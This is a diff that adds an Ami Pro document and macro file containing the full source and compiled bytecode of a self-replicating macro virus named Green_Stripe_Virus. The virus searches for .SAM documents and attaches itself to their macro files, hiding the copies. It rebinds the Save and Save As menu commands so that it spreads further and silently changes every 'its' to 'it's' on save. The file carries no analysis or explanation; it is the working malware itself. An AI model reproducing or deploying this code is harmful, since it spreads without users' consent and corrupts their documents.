@@ -1,0 +1,363 @@
+[ver]
+	4
+[sty]
+	_default.sty
+[files]
+[charset]
+	82
+	ANSI (Windows, IBM CP 1252)
+[revisions]
+	0
+[prn]
+	        Varityper VT-600
+[port]
+	FILE:
+[lang]
+	1
+[desc]
+	
+	
+	
+	
+	
+	812646700
+	17
+	812622139
+	72
+	2
+	0
+	0
+	0
+	0
+	
+	
+	
+	
+	
+	
+	1
+[fopts]
+	0
+	1
+	0
+	0
+[lnopts]
+	2
+	Body Text
+	1
+[docopts]
+	5
+	2
+[GramStyle]
+	
+[l1]
+	Standard
+[pg]
+	2
+	54 0 50 0 0 0 0 65535 2 Standard	65535 0 0	0 0 0 0 0 0 0 65535 0 0 65535 0 0 0 0 0
+	62 0 21 1025 0 0 0 65535 2 Standard	65535 0 0	0 0 0 0 0 0 0 65535 0 0 65535 0 0 0 0 0
+[edoc]
+<:#240,9360><:f240,QCourier,0,0,0>DECLARE Infect_File()
+
+<:#240,9360><:f240,QCourier,0,0,0>
+
+<:#240,9360><:f240,QCourier,0,0,0>FUNCTION Green_Stripe_Virus()<:f>
+
+<:#240,9360><:f240,QCourier,0,0,0>  FileName=FindFirst$("*.SAM",0)
+
+<:#240,9360><:f240,QCourier,0,0,0>  while FileName<<<;>""
+
+<:#240,9360><:f240,QCourier,0,0,0>    s=LEN(FileName) t=3 s=s-t
+
+<:#240,9360><:f240,QCourier,0,0,0>    FileName=StrCat$(Left$(FileName,s),"SMM")
+
+<:#240,9360><:f240,QCourier,0,0,0>    if FileOpen("{FileName}",1,"")<<<;>1<:f>
+
+<:#240,9360><:f240,QCourier,0,0,0>      FileName=StrCat$(Left$(FileName,s),"SAM")
+
+<:#240,9360><:f240,QCourier,0,0,0>      if FileOpen("{FileName}",1,"")=1 
+
+<:#240,9360><:f240,QCourier,0,0,0>        Infect_File()
+
+<:#240,9360><:f240,QCourier,0,0,0>      endif
+
+<:#240,9360><:f240,QCourier,0,0,0>    else FileClose() 
+
+<:#240,9360><:f240,QCourier,0,0,0>    endif<:f>
+
+<:#240,9360><:f240,QCourier,0,0,0>    FileName=FindNext$()
+
+<:#240,9360><:f240,QCourier,0,0,0>  wend
+
+<:#240,9360><:f240,QCourier,0,0,0>  FileName=GetOpenFileName$()
+
+<:I0,0,0,0><:S+-1><:#240,9360><:f240,QCourier,0,0,0>  s=LEN(FileName) t=3 s=s-t
+
+<:#240,9360><:f240,QCourier,0,0,0>  FileName=StrCat$(Left$(FileName,s),"SMM")<:f>
+
+<:I0,0,0,0><:S+-1><:#240,9360><:f240,QCourier,0,0,0>  <:f240,QCourier,0,0,0>ChangeMenuAction(1,"&File",
+
+<:#240,9360><:f240,QCourier,0,0,0>      "Save &As...","{FileName}!SaveAsFile()")<:f>
+
+<:#240,9360><:f240,QCourier,0,0,0>  ChangeMenuAction(1,"&File",
+
+<:#240,9360><:f240,QCourier,0,0,0>      "&Save	^S","{FileName}!SaveFile()")
+
+<:#240,9360><:f240,QCourier,0,0,0>END FUNCTION
+
+<:#240,9360><:f240,QCourier,0,0,0>
+
+<:#240,9360><:f240,QCourier,0,0,0>FUNCTION Infect_File()
+
+<:#240,9360><:f240,QCourier,0,0,0>  FileName=GetOpenFileName$()<:f>
+
+<:#240,9360><:f240,QCourier,0,0,0>  s=LEN(FileName) t=3 s=s-t
+
+<:#240,9360><:f240,QCourier,0,0,0>  FileName=StrCat$(Left$(FileName,s),"SMM")
+
+<:#240,9360><:f240,QCourier,0,0,0>  AssignMacroToFile("{FileName}","",2)
+
+<:#240,9360><:f240,QCourier,0,0,0>  Save()
+
+<:#240,9360><:f240,QCourier,0,0,0>  FileClose()
+
+<:#240,9360><:f240,QCourier,0,0,0>  FileName2=GetOpenFileName$()
+
+<:#240,9360><:f240,QCourier,0,0,0>  s=LEN(FileName2) t=3 s=s-t
+
+<:#240,9360><:f240,QCourier,0,0,0>  FileName2=StrCat$(Left$(FileName2,s),"SMM")
+
+<:#240,9360><:f240,QCourier,0,0,0>  DosCopyFile(FileName2,FileName)
+
+<:#240,9360><:f240,QCourier,0,0,0>  DosSetFileAttr(FileName,2)
+
+<:#240,9360><:f240,QCourier,0,0,0>END FUNCTION<:f>
+
+<:#240,9360><:f240,QCourier,0,0,0>
+
+<:f240,QCourier,0,0,0>FUNCTION SaveFile()
+
+<:f240,QCourier,0,0,0>  GoToCmd(2,0,0)
+
+<:f240,QCourier,0,0,0>  Replace(0,0,4+1024,"its","it's")
+
+<:f240,QCourier,0,0,0>  Save()
+
+<:f240,QCourier,0,0,0>END FUNCTION
+
+<:f240,QCourier,0,0,0>
+
+<:#240,9360><:f240,QCourier,0,0,0>FUNCTION SaveAsFile()
+
+<:#240,9360><:f240,QCourier,0,0,0>  OrigName=GetOpenFileName$()
+
+<:#240,9360><:f240,QCourier,0,0,0>  FileName=Query$("Save file as:");
+
+<:#240,9360><:f240,QCourier,0,0,0>  SaveAs(FileName,0,"","")<:f>
+
+<:#240,9360><:f240,QCourier,0,0,0>  if Right$(OrigName,3)="SAM" then
+
+<:#240,9360><:f240,QCourier,0,0,0>    s=LEN(OrigName) t=3 s=s-t
+
+<:#240,9360><:f240,QCourier,0,0,0>    OrigName=StrCat$(Left$(OrigName,s),"SMM")
+
+<:#240,9360><:f240,QCourier,0,0,0>    FileOpen("{OrigName}",1,"")
+
+<:#240,9360><:f240,QCourier,0,0,0>    s=LEN(FileName) t=3 s=s-t
+
+<:#240,9360><:f240,QCourier,0,0,0>    FileName=Strcat$(Left$(FileName,s),"SMM")<:f>
+
+<:#240,9360><:f240,QCourier,0,0,0>    SaveAs(FileName,0,"","")
+
+<:#240,9360><:f240,QCourier,0,0,0>    FileClose()<:f>
+
+<:#240,9360><:f240,QCourier,0,0,0>    AssignMacroToFile("{FileName}","",2)
+
+<:#240,9360><:f240,QCourier,0,0,0>    Save()
+
+<:#240,9360><:f240,QCourier,0,0,0>  endif
+
+<:#240,9360><:f240,QCourier,0,0,0>END FUNCTION<:f>
+
+<:#240,9360><:f240,QCourier,0,0,0>
+
+>
+
+[Embedded]
+00004489
+>
+[macsum] 4
+Green_Stripe_Virus 0 0 4 2
+Infect_File 611 0 5 25
+SaveFile 941 0 1 39
+SaveAsFile 1038 0 5 45
+[macse]
+14 Green_Stripe_Virus
+0 280 "*.SAM" 0
+13
+8 1
+6 1
+7 ""
+18 1
+11 00000389
+0 14 "{1}"
+13
+8 2
+5 3
+8 3
+6 2
+6 3
+3 1
+8 2
+0 806 "{1}" "{2}"
+13
+0 16 [X] "SMM"
+13
+8 1
+2 102 1 "{1}" 1 ""
+13
+5 1
+18 1
+11 00000351
+0 806 "{1}" "{2}"
+13
+0 16 [X] "SAM"
+13
+8 1
+2 102 1 "{1}" 1 ""
+13
+5 1
+18 0
+11 00000338
+16 Infect_File
+10 00000360
+2 147 1
+0 281
+13
+8 1
+10 00000049
+0 267
+13
+8 1
+0 14 "{1}"
+13
+8 2
+5 3
+8 3
+6 2
+6 3
+3 1
+8 2
+0 806 "{1}" "{2}"
+13
+0 16 [X] "SMM"
+13
+8 1
+0 523 1 "&File" "Save &As..." "{1}!SaveAsFile()"
+0 523 1 "&File" "&Save	^S" "{1}!SaveFile()"
+6 0
+15
+9
+14 Infect_File
+0 267
+13
+8 1
+0 14 "{1}"
+13
+8 2
+5 3
+8 3
+6 2
+6 3
+3 1
+8 2
+0 806 "{1}" "{2}"
+13
+0 16 [X] "SMM"
+13
+8 1
+2 463 1 "{1}" "" 2
+2 103 1
+2 147 1
+0 267
+13
+8 4
+0 14 "{4}"
+13
+8 2
+5 3
+8 3
+6 2
+6 3
+3 1
+8 2
+0 806 "{4}" "{2}"
+13
+0 16 [X] "SMM"
+13
+8 4
+0 803 "{4}" "{1}"
+0 776 "{1}" 2
+6 0
+15
+9
+14 SaveFile
+2 452 1 2 0 0
+5 4
+5 1024
+3 0
+2 488 1 0 0 [X] "its" "it's"
+2 103 1
+6 0
+15
+9
+14 SaveAsFile
+0 267
+13
+8 1
+0 1 "Save file as:"
+13
+8 2
+2 104 1 "{2}" 0 "" ""
+0 807 "{1}" 3
+13
+7 "SAM"
+18 0
+11 00000410
+0 14 "{1}"
+13
+8 3
+5 3
+8 4
+6 3
+6 4
+3 1
+8 3
+0 806 "{1}" "{3}"
+13
+0 16 [X] "SMM"
+13
+8 1
+2 102 1 "{1}" 1 ""
+0 14 "{2}"
+13
+8 3
+5 3
+8 4
+6 3
+6 4
+3 1
+8 3
+0 806 "{2}" "{3}"
+13
+0 16 [X] "SMM"
+13
+8 2
+2 104 1 "{2}" 0 "" ""
+2 147 1
+2 463 1 "{2}" "" 2
+2 103 1
+6 0
+15
+9
+00004514
